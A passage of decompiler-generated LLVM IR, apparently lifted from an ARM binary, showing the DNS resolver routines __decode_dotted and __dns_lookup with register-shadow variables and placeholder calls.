  uselistorder label %dec_label_pc_1d184, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1d180, { 1, 0 }
  uselistorder label %dec_label_pc_1d138, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %v6_1d31c = load i32, i32* @r5, align 4
  %v0_1d320 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1d320, i32* %sl.global-to-local, align 4
  %v2_1d320 = icmp eq i32 %v0_1d320, 0
  br i1 %v2_1d320, label %.thread30, label %dec_label_pc_1d348.preheader

.thread30:                                        ; preds = %entry
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_1d408

dec_label_pc_1d348.preheader:                     ; preds = %entry
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %fp.global-to-local, align 4
  store i32 %arg3, i32* %sb.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1d3484 = load i32, i32* @r1, align 4
  %v6_1d34c14 = icmp slt i32 %v0_1d3484, %arg2
  br i1 %v6_1d34c14, label %dec_label_pc_1d350.preheader, label %dec_label_pc_1d408

dec_label_pc_1d350.preheader:                     ; preds = %dec_label_pc_1d348.preheader
  %v2_1d35051 = add i32 %v0_1d320, %v0_1d3484
  %v3_1d35052 = inttoptr i32 %v2_1d35051 to i8*
  %v4_1d35053 = load i8, i8* %v3_1d35052, align 1
  %v6_1d35054 = zext i8 %v4_1d35053 to i32
  store i32 %v6_1d35054, i32* @r4, align 4
  %v2_1d35455 = icmp eq i8 %v4_1d35053, 0
  br i1 %v2_1d35455, label %bb49, label %dec_label_pc_1d35c

dec_label_pc_1d344:                               ; preds = %bb48, %bb44
  %v1_1d348 = phi i32 [ %v1_1d348.pre, %bb48 ], [ %v1_1d37459, %bb44 ]
  %v0_1d348 = phi i32 [ %v0_1d348.pre, %bb48 ], [ %v5_1d38c, %bb44 ]
  %v0_1d344 = phi i32 [ %v0_1d344.pre, %bb48 ], [ %v0_1d39060, %bb44 ]
  store i32 %v0_1d344, i32* %r0.global-to-local, align 4
  %v6_1d34c = icmp slt i32 %v0_1d348, %v1_1d348
  br i1 %v6_1d34c, label %dec_label_pc_1d344.dec_label_pc_1d350_crit_edge, label %dec_label_pc_1d408

dec_label_pc_1d344.dec_label_pc_1d350_crit_edge:  ; preds = %dec_label_pc_1d344
  %v0_1d350.pre = load i32, i32* %sl.global-to-local, align 4
  %v2_1d350 = add i32 %v0_1d350.pre, %v0_1d348
  %v3_1d350 = inttoptr i32 %v2_1d350 to i8*
  %v4_1d350 = load i8, i8* %v3_1d350, align 1
  %v6_1d350 = zext i8 %v4_1d350 to i32
  store i32 %v6_1d350, i32* @r4, align 4
  %v2_1d354 = icmp eq i8 %v4_1d350, 0
  %v0_1d3f4 = load i32, i32* @ip, align 4
  %v2_1d3f4 = icmp eq i32 %v0_1d3f4, 0
  br i1 %v2_1d354, label %dec_label_pc_1d3f4, label %dec_label_pc_1d35c

dec_label_pc_1d35c:                               ; preds = %dec_label_pc_1d350.preheader, %dec_label_pc_1d344.dec_label_pc_1d350_crit_edge
  %v2_1d3f466 = phi i1 [ %v2_1d3f4, %dec_label_pc_1d344.dec_label_pc_1d350_crit_edge ], [ false, %dec_label_pc_1d350.preheader ]
  %v0_1d3f464 = phi i32 [ %v0_1d3f4, %dec_label_pc_1d344.dec_label_pc_1d350_crit_edge ], [ 1, %dec_label_pc_1d350.preheader ]
  %v6_1d35063 = phi i32 [ %v6_1d350, %dec_label_pc_1d344.dec_label_pc_1d350_crit_edge ], [ %v6_1d35054, %dec_label_pc_1d350.preheader ]
  %v0_1d37c62 = phi i32 [ %v0_1d350.pre, %dec_label_pc_1d344.dec_label_pc_1d350_crit_edge ], [ %v0_1d320, %dec_label_pc_1d350.preheader ]
  %v0_1d36c61 = phi i32 [ %v0_1d348, %dec_label_pc_1d344.dec_label_pc_1d350_crit_edge ], [ %v0_1d3484, %dec_label_pc_1d350.preheader ]
  %v0_1d39060 = phi i32 [ %v0_1d344, %dec_label_pc_1d344.dec_label_pc_1d350_crit_edge ], [ 0, %dec_label_pc_1d350.preheader ]
  %v1_1d37459 = phi i32 [ %v1_1d348, %dec_label_pc_1d344.dec_label_pc_1d350_crit_edge ], [ %arg2, %dec_label_pc_1d350.preheader ]
  %v1_1d360 = and i32 %v6_1d35063, 192
  br i1 %v2_1d3f466, label %bb42, label %bb

bb:                                               ; preds = %dec_label_pc_1d35c
  %v1_1d364 = load i32, i32* %r8.global-to-local, align 4
  %v2_1d364 = add i32 %v1_1d364, 1
  store i32 %v2_1d364, i32* %r8.global-to-local, align 4
  br label %bb42

bb42:                                             ; preds = %dec_label_pc_1d35c, %bb
  %v2_1d368 = icmp eq i32 %v1_1d360, 192
  %v1_1d36c = add i32 %v0_1d36c61, 1
  store i32 %v1_1d36c, i32* %r1.global-to-local, align 4
  br i1 %v2_1d368, label %dec_label_pc_1d374, label %dec_label_pc_1d39c

dec_label_pc_1d374:                               ; preds = %bb42
  %v6_1d378 = icmp slt i32 %v1_1d36c, %v1_1d37459
  br i1 %v6_1d378, label %dec_label_pc_1d37c, label %dec_label_pc_1d408

dec_label_pc_1d37c:                               ; preds = %dec_label_pc_1d374
  %v2_1d37c = add i32 %v1_1d36c, %v0_1d37c62
  %v3_1d37c = inttoptr i32 %v2_1d37c to i8*
  %v4_1d37c = load i8, i8* %v3_1d37c, align 1
  %v6_1d37c = zext i8 %v4_1d37c to i32
  %v1_1d384 = urem i32 %v6_1d35063, 64
  br i1 %v2_1d3f466, label %bb44, label %bb43

bb43:                                             ; preds = %dec_label_pc_1d37c
  %v1_1d388 = load i32, i32* %r8.global-to-local, align 4
  %v2_1d388 = add i32 %v1_1d388, 1
  store i32 %v2_1d388, i32* %r8.global-to-local, align 4
  br label %bb44

bb44:                                             ; preds = %dec_label_pc_1d37c, %bb43
  %v4_1d38c = mul nuw nsw i32 %v1_1d384, 256
  %v5_1d38c = or i32 %v6_1d37c, %v4_1d38c
  store i32 %v5_1d38c, i32* %r1.global-to-local, align 4
  store i32 %v0_1d39060, i32* %r7.global-to-local, align 4
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1d344

dec_label_pc_1d39c:                               ; preds = %bb42
  %v2_1d39c = add i32 %v6_1d35063, %v0_1d39060
  store i32 %v2_1d39c, i32* %r6.global-to-local, align 4
  %v3_1d3a0 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1d3a0, i32* @r3, align 4
  %v1_1d3a4 = add i32 %v2_1d39c, 1
  store i32 %v1_1d3a4, i32* %r7.global-to-local, align 4
  %v3_1d3a8 = icmp ult i32 %v1_1d3a4, %v3_1d3a0
  br i1 %v3_1d3a8, label %dec_label_pc_1d3b0, label %dec_label_pc_1d408

dec_label_pc_1d3b0:                               ; preds = %dec_label_pc_1d39c
  %v2_1d3b0 = add i32 %v6_1d35063, %v1_1d36c
  store i32 %v2_1d3b0, i32* @r5, align 4
  %v3_1d3b4 = icmp ult i32 %v2_1d3b0, %v1_1d37459
  br i1 %v3_1d3b4, label %dec_label_pc_1d3bc, label %dec_label_pc_1d408

dec_label_pc_1d3bc:                               ; preds = %dec_label_pc_1d3b0
  %v2_1d3bc = add i32 %v1_1d36c, %v0_1d37c62
  store i32 %v2_1d3bc, i32* @r1, align 4
  %v0_1d3c0 = load i32, i32* %sb.global-to-local, align 4
  %v2_1d3c0 = add i32 %v0_1d3c0, %v0_1d39060
  store i32 %v2_1d3c0, i32* @r0, align 4
  store i32 %v6_1d35063, i32* @r2, align 4
  %v0_1d3cc = call i32 @memcpy()
  store i32 %v0_1d3cc, i32* %r0.global-to-local, align 4
  store i32 %v0_1d3f464, i32* @ip, align 4
  %v0_1d3d4 = load i32, i32* %sl.global-to-local, align 4
  %v1_1d3d4 = load i32, i32* @r5, align 4
  %v2_1d3d4 = add i32 %v1_1d3d4, %v0_1d3d4
  %v3_1d3d4 = inttoptr i32 %v2_1d3d4 to i8*
  %v4_1d3d4 = load i8, i8* %v3_1d3d4, align 1
  br i1 %v2_1d3f466, label %bb46, label %bb45

bb45:                                             ; preds = %dec_label_pc_1d3bc
  %v1_1d3dc = load i32, i32* %r8.global-to-local, align 4
  %v2_1d3dc = load i32, i32* @r4, align 4
  %v3_1d3dc = add i32 %v2_1d3dc, %v1_1d3dc
  store i32 %v3_1d3dc, i32* %r8.global-to-local, align 4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_1d3bc, %bb45
  %v2_1d3e0 = icmp eq i8 %v4_1d3d4, 0
  br i1 %v2_1d3e0, label %bb48, label %bb47

bb47:                                             ; preds = %bb46
  br label %bb48

bb48:                                             ; preds = %bb46, %bb47
  %v0_1d3ec.off0 = phi i8 [ 0, %bb46 ], [ 46, %bb47 ]
  store i32 %v1_1d3d4, i32* %r1.global-to-local, align 4
  %v2_1d3ec = load i32, i32* %sb.global-to-local, align 4
  %v3_1d3ec = load i32, i32* %r6.global-to-local, align 4
  %v4_1d3ec = add i32 %v3_1d3ec, %v2_1d3ec
  %v5_1d3ec = inttoptr i32 %v4_1d3ec to i8*
  store i8 %v0_1d3ec.off0, i8* %v5_1d3ec, align 1
  %v0_1d344.pre = load i32, i32* %r7.global-to-local, align 4
  %v0_1d348.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_1d348.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_1d344

dec_label_pc_1d3f4:                               ; preds = %dec_label_pc_1d344.dec_label_pc_1d350_crit_edge
  %v0_1d3fc.pre.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1d3f4, label %dec_label_pc_1d408, label %bb49

bb49:                                             ; preds = %dec_label_pc_1d350.preheader, %dec_label_pc_1d3f4
  %v0_1d3fc.pre69 = phi i32 [ %v0_1d3fc.pre.pre, %dec_label_pc_1d3f4 ], [ 0, %dec_label_pc_1d350.preheader ]
  %v2_1d3f8 = add i32 %v0_1d3fc.pre69, 1
  store i32 %v2_1d3f8, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1d408

dec_label_pc_1d408:                               ; preds = %dec_label_pc_1d3b0, %dec_label_pc_1d39c, %dec_label_pc_1d374, %dec_label_pc_1d344, %dec_label_pc_1d3f4, %dec_label_pc_1d348.preheader, %bb49, %.thread30
  %storemerge = phi i32 [ -1, %.thread30 ], [ %v2_1d3f8, %bb49 ], [ -1, %dec_label_pc_1d348.preheader ], [ %v0_1d3fc.pre.pre, %dec_label_pc_1d3f4 ], [ -1, %dec_label_pc_1d39c ], [ -1, %dec_label_pc_1d3b0 ], [ -1, %dec_label_pc_1d344 ], [ -1, %dec_label_pc_1d374 ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_1d31c, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1d3fc.pre.pre, { 1, 0 }
  uselistorder i32 %v1_1d3d4, { 1, 0 }
  uselistorder i32 %v5_1d38c, { 1, 0 }
  uselistorder i32 %v1_1d36c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_1d39060, { 3, 2, 0, 1 }
  uselistorder i32 %v6_1d35063, { 2, 4, 3, 0, 1 }
  uselistorder i1 %v2_1d3f466, { 1, 2, 0 }
  uselistorder i32 %v0_1d320, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 5, 2, 6, 3, 7, 8 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1d408, { 6, 4, 0, 1, 2, 3, 5, 7 }
  uselistorder label %bb49, { 1, 0 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb44, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %dec_label_pc_1d35c, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %tmp159 = call i32 @__decompiler_undefined_function_0()
  %tmp160 = call i32 @__decompiler_undefined_function_0()
  %tmp161 = call i32 @__decompiler_undefined_function_0()
  %tmp172 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-448 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-104 = alloca i16, align 2
  %stack_var_-76 = alloca i32, align 4
  %v3_1d414 = load i32, i32* @r4, align 4
  %v6_1d414 = load i32, i32* @r5, align 4
  %v9_1d414 = load i32, i32* @r6, align 4
  %v12_1d414 = load i32, i32* @r7, align 4
  %v15_1d414 = load i32, i32* @r8, align 4
  %v18_1d414 = load i32, i32* @sb, align 4
  %v21_1d414 = load i32, i32* @sl, align 4
  %v24_1d414 = load i32, i32* @fp, align 4
  %v27_1d414 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg4, i32* @fp, align 4
  %v0_1d428 = load i32, i32* %r1.global-to-local, align 4
  %v1_1d430 = call i32 @malloc(i32 512)
  store i32 %v1_1d430, i32* @sl, align 4
  %v0_1d438 = load i32, i32* @r4, align 4
  %v1_1d438 = inttoptr i32 %v0_1d438 to i8*
  %v3_1d43c = call i32 @strlen(i8* %v1_1d438)
  store i32 894, i32* %r3.global-to-local, align 4
  %v3_1d448 = icmp ugt i32 %v3_1d43c, 893
  store i1 %v3_1d448, i1* %cpsr_c.global-to-local, align 1
  store i32 ptrtoint (i32* @global_var_2e024.1314 to i32), i32* @r8, align 4
  %tmp285 = icmp ugt i32 %v3_1d43c, 894
  br i1 %tmp285, label %.thread132, label %dec_label_pc_1d468

.thread132:                                       ; preds = %entry
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1db78

dec_label_pc_1d468:                               ; preds = %entry
  %v1_1d46c = add i32 %v3_1d43c, 130
  %v1_1d470 = call i32 @malloc(i32 %v1_1d46c)
  store i32 %v1_1d470, i32* @r0, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d474 = icmp eq i32 %v1_1d470, 0
  br i1 %v2_1d474, label %.thread5, label %bb

bb:                                               ; preds = %dec_label_pc_1d468
  %v1_1d478 = load i32, i32* @sl, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_1d478 = icmp eq i32 %v1_1d478, 0
  br i1 %v3_1d478, label %bb213, label %dec_label_pc_1d48c

.thread5:                                         ; preds = %dec_label_pc_1d468
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1db70

bb213:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1db70

dec_label_pc_1d48c:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v0_1d48c = load i32, i32* @r4, align 4
  %v1_1d48c = inttoptr i32 %v0_1d48c to i8*
  %v2_1d48c = load i8, i8* %v1_1d48c, align 1
  %v3_1d48c = zext i8 %v2_1d48c to i32
  store i32 %v3_1d48c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1d490 = icmp eq i8 %v2_1d48c, 0
  br i1 %v2_1d490, label %dec_label_pc_1db70, label %dec_label_pc_1d498

dec_label_pc_1d498:                               ; preds = %dec_label_pc_1d48c
  %v2_1d49c = add i32 %v0_1d48c, %v3_1d43c
  store i32 %v2_1d49c, i32* %r3.global-to-local, align 4
  %v1_1d4a0 = add i32 %v2_1d49c, -1
  %v2_1d4a0 = inttoptr i32 %v1_1d4a0 to i8*
  %v3_1d4a0 = load i8, i8* %v2_1d4a0, align 1
  %v4_1d4a0 = zext i8 %v3_1d4a0 to i32
  store i32 %v4_1d4a0, i32* @r3, align 4
  store i32 %v3_1d43c, i32* @r2, align 4
  store i32 %v0_1d48c, i32* @r1, align 4
  %v0_1d4b0 = call i32 @memcpy()
  store i32 20, i32* %r3.global-to-local, align 4
  store i32 27396, i32* %ip.global-to-local, align 4
  store i32 26360, i32* %r1.global-to-local, align 4
  store i32 -1, i32* @sb, align 4
  %v2_1d52c = ptrtoint i32* %stack_var_-76 to i32
  %v2_1d644 = ptrtoint i16* %stack_var_-104 to i32
  %v15_1d648 = ptrtoint i32* %stack_var_-88 to i32
  %v2_1d66c = ptrtoint i32* %stack_var_-192 to i32
  %v2_1d68c = bitcast i32* %stack_var_-192 to i8*
  %v2_1d740 = ptrtoint i32* %stack_var_-48 to i32
  %v2_1d74c = ptrtoint i32* %stack_var_-56 to i32
  %v2_1d7d8 = icmp eq i32 %tmp161, 0
  %v1_1d7e4 = add i32 %tmp160, -2
  %v2_1d7e8 = icmp ne i32 %v1_1d7e4, 0
  %tmp214 = icmp slt i32 %tmp159, 1
  %v2_1d8d4 = ptrtoint i32* %stack_var_-448 to i32
  %v2_1d8d8 = ptrtoint i32* %stack_var_-144 to i32
  %v5_1db1c56 = icmp sgt i32 %tmp159, 0
  %v2_1da44 = icmp ne i32 %v0_1d428, 0
  %v7_1da44 = icmp eq i32 %v0_1d428, 1
  %v1_1d938 = bitcast i32* %stack_var_-448 to i8*
  %v2_1d9ec = icmp eq i32 %tmp144, 0
  %v2_1d7f4 = icmp ugt i8 %v3_1d4a0, 45
  %v7_1d7f4 = icmp eq i8 %v3_1d4a0, 46
  %v1_1d5a0 = add i32 %v1_1d470, 1
  %stack_var_-476.0.pre = load i32, i32* @r5, align 4
  %v4_1d580 = add i32 %v1_1d470, %v3_1d43c
  %v5_1d580 = inttoptr i32 %v4_1d580 to i8*
  %v1_1d7e4.cmp = icmp ugt i32 %v1_1d7e4, 1
  %v2_1d81c = icmp eq i32 %tmp160, 0
  %v3_1da48 = icmp ugt i32 %v0_1d428, 27
  %v8_1da48 = icmp eq i32 %v0_1d428, 28
  br label %dec_label_pc_1d510

dec_label_pc_1d510:                               ; preds = %dec_label_pc_1db58, %dec_label_pc_1d498
  %stack_var_-476.0 = phi i32 [ %stack_var_-476.0.pre, %dec_label_pc_1d498 ], [ %v1_1db5c, %dec_label_pc_1db58 ]
  %stack_var_-464.0 = phi i32 [ %tmp172, %dec_label_pc_1d498 ], [ %v3_1d624, %dec_label_pc_1db58 ]
  %stack_var_-468.0 = phi i32 [ -1, %dec_label_pc_1d498 ], [ %stack_var_-468.2, %dec_label_pc_1db58 ]
  %v1_1d518 = phi i32 [ -1, %dec_label_pc_1d498 ], [ %v3_1d6f8, %dec_label_pc_1db58 ]
  store i32 %v1_1d518, i32* %r3.global-to-local, align 4
  %v2_1d514 = icmp eq i32 %v1_1d518, -1
  store i1 %v2_1d514, i1* %cpsr_c.global-to-local, align 1
  %v7_1d514 = icmp eq i32 %v1_1d518, -1
  br i1 %v7_1d514, label %bb216, label %bb215

bb215:                                            ; preds = %dec_label_pc_1d510
  br label %bb216

bb216:                                            ; preds = %dec_label_pc_1d510, %bb215
  %v1_1d51c = xor i1 %v7_1d514, true
  call void @__pseudo_cond_branch(i1 %v1_1d51c, i32 ptrtoint (i32* @global_var_14388.1677 to i32))
  store i32 40, i32* @r7, align 4
  %v0_1d528 = load i32, i32* @r8, align 4
  %v2_1d528 = add i32 %v0_1d528, 44
  %v3_1d528 = inttoptr i32 %v2_1d528 to i32*
  %v4_1d528 = load i32, i32* %v3_1d528, align 4
  store i32 %v4_1d528, i32* @r4, align 4
  store i32 %v2_1d52c, i32* @r5, align 4
  store i32 80, i32* %ip.global-to-local, align 4
  %v2_1d538 = add i32 %v0_1d528, 40
  %v3_1d538 = inttoptr i32 %v2_1d538 to i32*
  %v4_1d538 = load i32, i32* %v3_1d538, align 4
  store i32 %v4_1d538, i32* %r1.global-to-local, align 4
  %v2_1d540 = add i32 %v0_1d528, 80
  %v3_1d540 = inttoptr i32 %v2_1d540 to i32*
  %v4_1d540 = load i32, i32* %v3_1d540, align 4
  store i32 %v4_1d540, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1d540)
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_1d554 = load i32, i32* @r8, align 4
  %v2_1d554 = add i32 %v0_1d554, 20
  %v3_1d554 = inttoptr i32 %v2_1d554 to i32*
  %v4_1d554 = load i32, i32* %v3_1d554, align 4
  store i32 %v4_1d554, i32* %ip.global-to-local, align 4
  store i32 120160, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_1d554)
  %v0_1d560 = call i32 @__open_nameservers()
  %v0_1d568 = load i32, i32* @r8, align 4
  %v2_1d568 = add i32 %v0_1d568, 27408
  %v3_1d568 = inttoptr i32 %v2_1d568 to i32*
  %v4_1d568 = load i32, i32* %v3_1d568, align 4
  store i32 %v1_1d470, i32* %r3.global-to-local, align 4
  store i32 %v3_1d43c, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_1d578 = load i32, i32* @sb, align 4
  %v3_1d578 = icmp uge i32 %v0_1d578, %v4_1d568
  store i1 %v3_1d578, i1* %cpsr_c.global-to-local, align 1
  store i8 0, i8* %v5_1d580, align 1
  %v0_1d584 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1d584, label %dec_label_pc_1d5b0, label %dec_label_pc_1d588

dec_label_pc_1d588:                               ; preds = %bb216
  store i32 46, i32* %r3.global-to-local, align 4
  %v3_1d590 = load i32, i32* %ip.global-to-local, align 4
  %v4_1d590 = add i32 %v3_1d590, %v1_1d470
  %v5_1d590 = inttoptr i32 %v4_1d590 to i8*
  store i8 46, i8* %v5_1d590, align 1
  store i32 27396, i32* %r1.global-to-local, align 4
  %v0_1d59c = load i32, i32* @r8, align 4
  %v2_1d59c = add i32 %v0_1d59c, 27396
  %v3_1d59c = inttoptr i32 %v2_1d59c to i32*
  %v4_1d59c = load i32, i32* %v3_1d59c, align 4
  store i32 %v4_1d59c, i32* %r3.global-to-local, align 4
  %v1_1d5a4 = load i32, i32* %ip.global-to-local, align 4
  %v2_1d5a4 = add i32 %v1_1d5a0, %v1_1d5a4
  %v1_1d5a8 = load i32, i32* @sb, align 4
  %v2_1d5a8 = and i32 %v1_1d5a8, 1073741824
  %v3_1d5a8 = icmp ne i32 %v2_1d5a8, 0
  store i1 %v3_1d5a8, i1* %cpsr_c.global-to-local, align 1
  %v4_1d5a8 = mul i32 %v1_1d5a8, 4
  %v5_1d5a8 = add i32 %v4_1d5a8, %v4_1d59c
  %v6_1d5a8 = inttoptr i32 %v5_1d5a8 to i32*
  %v7_1d5a8 = load i32, i32* %v6_1d5a8, align 4
  store i32 %v7_1d5a8, i32* @r1, align 4
  %v2_1d5ac = inttoptr i32 %v2_1d5a4 to i8*
  %v3_1d5ac = call i32 @strcpy(i8* %v2_1d5ac, i32 %v7_1d5a8)
  br label %dec_label_pc_1d5b0

dec_label_pc_1d5b0:                               ; preds = %bb216, %dec_label_pc_1d588
  store i32 %stack_var_-468.0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_1d5b4 = icmp slt i32 %stack_var_-468.0, 0
  br i1 %v1_1d5b4, label %dec_label_pc_1d5bc, label %dec_label_pc_1d5b0.dec_label_pc_1d5ec_crit_edge

dec_label_pc_1d5b0.dec_label_pc_1d5ec_crit_edge:  ; preds = %dec_label_pc_1d5b0
  %v0_1d5f4.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1d5ec

dec_label_pc_1d5bc:                               ; preds = %dec_label_pc_1d5b0
  store i32 27404, i32* %r3.global-to-local, align 4
  store i32 1179, i32* %ip.global-to-local, align 4
  %v0_1d5c4 = load i32, i32* @r8, align 4
  %v2_1d5c4 = add i32 %v0_1d5c4, 27404
  %v3_1d5c4 = inttoptr i32 %v2_1d5c4 to i32*
  %v4_1d5c4 = load i32, i32* %v3_1d5c4, align 4
  %v2_1d5c8 = add i32 %v0_1d5c4, 1179
  %v3_1d5c8 = inttoptr i32 %v2_1d5c8 to i8*
  %v4_1d5c8 = load i8, i8* %v3_1d5c8, align 1
  %v6_1d5c8 = zext i8 %v4_1d5c8 to i32
  %v2_1d5cc = mul i32 %v6_1d5c8, %v4_1d5c4
  store i32 %v2_1d5cc, i32* %r3.global-to-local, align 4
  store i32 26360, i32* %r1.global-to-local, align 4
  %v2_1d5d8 = add i32 %v0_1d5c4, 1176
  %v3_1d5d8 = inttoptr i32 %v2_1d5d8 to i16*
  %v4_1d5d8 = load i16, i16* %v3_1d5d8, align 2
  %v6_1d5d8 = zext i16 %v4_1d5d8 to i32
  %v2_1d5dc = add i32 %v0_1d5c4, 26360
  %v3_1d5dc = inttoptr i32 %v2_1d5dc to i32*
  %v4_1d5dc = load i32, i32* %v3_1d5dc, align 4
  store i32 %v4_1d5dc, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1d5ec

dec_label_pc_1d5ec:                               ; preds = %dec_label_pc_1d5b0.dec_label_pc_1d5ec_crit_edge, %dec_label_pc_1d5bc
  %v2_1d630 = phi i32 [ %v0_1d5c4, %dec_label_pc_1d5bc ], [ %v0_1d5f4.pre, %dec_label_pc_1d5b0.dec_label_pc_1d5ec_crit_edge ]
  %stack_var_-464.1 = phi i32 [ %v6_1d5d8, %dec_label_pc_1d5bc ], [ %stack_var_-464.0, %dec_label_pc_1d5b0.dec_label_pc_1d5ec_crit_edge ]
  %stack_var_-468.1 = phi i32 [ %v4_1d5dc, %dec_label_pc_1d5bc ], [ %stack_var_-468.0, %dec_label_pc_1d5b0.dec_label_pc_1d5ec_crit_edge ]
  %stack_var_-476.1 = phi i32 [ %v2_1d5cc, %dec_label_pc_1d5bc ], [ %stack_var_-476.0, %dec_label_pc_1d5b0.dec_label_pc_1d5ec_crit_edge ]
  store i32 27404, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-468.1, i32* %ip.global-to-local, align 4
  %v2_1d5f4 = add i32 %v2_1d630, 27404
  %v3_1d5f4 = inttoptr i32 %v2_1d5f4 to i32*
  %v4_1d5f4 = load i32, i32* %v3_1d5f4, align 4
  store i32 27400, i32* %r3.global-to-local, align 4
  %v3_1d5fc = icmp uge i32 %stack_var_-468.1, %v4_1d5f4
  store i1 %v3_1d5fc, i1* %cpsr_c.global-to-local, align 1
  %v2_1d600 = add i32 %v2_1d630, 27400
  %v3_1d600 = inttoptr i32 %v2_1d600 to i32*
  %v4_1d600 = load i32, i32* %v3_1d600, align 4
  store i32 %v4_1d600, i32* %r3.global-to-local, align 4
  br i1 %v3_1d5fc, label %bb217, label %bb218

bb217:                                            ; preds = %dec_label_pc_1d5ec
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb218

bb218:                                            ; preds = %dec_label_pc_1d5ec, %bb217
  %v0_1d60c = phi i32 [ %stack_var_-468.1, %dec_label_pc_1d5ec ], [ 0, %bb217 ]
  %v3_1d60c = mul i32 %v0_1d60c, 28
  %v4_1d60c = add i32 %v3_1d60c, %v4_1d600
  store i32 %v4_1d60c, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-464.1, i32* %ip.global-to-local, align 4
  %v1_1d618 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_1d624 = urem i32 %v1_1d618, 65536
  store i32 26360, i32* %r1.global-to-local, align 4
  %v1_1d630 = trunc i32 %v1_1d618 to i16
  %v4_1d630 = add i32 %v2_1d630, 1176
  %v5_1d630 = inttoptr i32 %v4_1d630 to i16*
  store i16 %v1_1d630, i16* %v5_1d630, align 2
  %v1_1d638 = load i32, i32* @r8, align 4
  %v2_1d638 = load i32, i32* %r1.global-to-local, align 4
  %v3_1d638 = add i32 %v2_1d638, %v1_1d638
  %v4_1d638 = inttoptr i32 %v3_1d638 to i32*
  store i32 %v0_1d60c, i32* %v4_1d638, align 4
  %v0_1d63c = load i32, i32* %r3.global-to-local, align 4
  %v1_1d640 = inttoptr i32 %v0_1d63c to i32*
  %v2_1d640 = load i32, i32* %v1_1d640, align 4
  %v3_1d640 = add i32 %v0_1d63c, 4
  %v4_1d640 = inttoptr i32 %v3_1d640 to i32*
  %v5_1d640 = load i32, i32* %v4_1d640, align 4
  store i32 %v5_1d640, i32* %r1.global-to-local, align 4
  %v9_1d640 = add i32 %v0_1d63c, 12
  %v10_1d640 = inttoptr i32 %v9_1d640 to i32*
  %v11_1d640 = load i32, i32* %v10_1d640, align 4
  store i32 %v11_1d640, i32* %r3.global-to-local, align 4
  %v12_1d640 = add i32 %v0_1d63c, 16
  %v4_1d648 = trunc i32 %v2_1d640 to i16
  store i16 %v4_1d648, i16* %stack_var_-104, align 2
